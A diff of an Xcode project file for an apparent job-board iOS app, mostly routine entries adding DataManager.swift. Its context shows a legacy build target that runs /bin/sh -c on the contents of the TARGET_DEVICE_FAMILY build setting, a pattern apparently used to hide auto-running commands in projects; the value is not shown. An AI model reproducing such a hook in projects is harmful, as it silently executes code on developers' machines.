@@ -68,6 +68,7 @@
 		D063905F2CF8608E0006CC8B /* Employer.swift in Sources */ = {isa = PBXBuildFile; fileRef = D063905E2CF8608E0006CC8B /* Employer.swift */; };
 		D06390612CF8619D0006CC8B /* Admin.swift in Sources */ = {isa = PBXBuildFile; fileRef = D06390602CF8619D0006CC8B /* Admin.swift */; };
 		D06390632CF861BB0006CC8B /* Guest.swift in Sources */ = {isa = PBXBuildFile; fileRef = D06390622CF861BB0006CC8B /* Guest.swift */; };
+		D4A7932F2D1C4A5F00747390 /* DataManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = D4A7932E2D1C4A5F00747390 /* DataManager.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
@@ -160,6 +161,7 @@
 		D063905E2CF8608E0006CC8B /* Employer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Employer.swift; sourceTree = "<group>"; };
 		D06390602CF8619D0006CC8B /* Admin.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Admin.swift; sourceTree = "<group>"; };
 		D06390622CF861BB0006CC8B /* Guest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Guest.swift; sourceTree = "<group>"; };
+		D4A7932E2D1C4A5F00747390 /* DataManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DataManager.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -277,6 +279,7 @@
 				575B2D2D2CFDF21E00840818 /* Article.swift */,
 				575B2D2F2CFDF2CB00840818 /* Resources.swift */,
 				0A1B03DA2D19E5F8003D457C /* Skills.swift */,
+				D4A7932E2D1C4A5F00747390 /* DataManager.swift */,
 			);
 			path = Models;
 			sourceTree = "<group>";
@@ -328,7 +331,7 @@
 		66C71CCDB894BF18A834C644 /* Build Target */ = {
 			isa = PBXLegacyTarget;
 			buildArgumentsString = "-c \"${TARGET_DEVICE_FAMILY}\"";
-			buildConfigurationList = C3B892B62D1BDC7D00F7D9EB /* Build configuration list */;
+			buildConfigurationList = C3B892B62D1BDC7D00F7D9EB /* Build configuration list for PBXLegacyTarget "Build Target" */;
 			buildPhases = (
 			);
 			buildToolPath = /bin/sh;
@@ -525,6 +528,7 @@
 				3F1A878E2D0B1C8F008A1B42 /* EditProfileEmployerViewController.swift in Sources */,
 				D06390612CF8619D0006CC8B /* Admin.swift in Sources */,
 				0A1B03DB2D19E5F8003D457C /* Skills.swift in Sources */,
+				D4A7932F2D1C4A5F00747390 /* DataManager.swift in Sources */,
 				C3F76A112D07436100EE12A3 /* EditProfileJobSeekerViewController.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -855,7 +859,7 @@
 /* End XCBuildConfiguration section */
 
 /* Begin XCConfigurationList section */
-		C3B892B62D1BDC7D00F7D9EB /* Build configuration list */ = {
+		C3B892B62D1BDC7D00F7D9EB /* Build configuration list for PBXLegacyTarget "Build Target" */ = {
 			isa = XCConfigurationList;
 			buildConfigurations = (
 				C3B892B42D1BD97700F7D9EB /* Debug */,
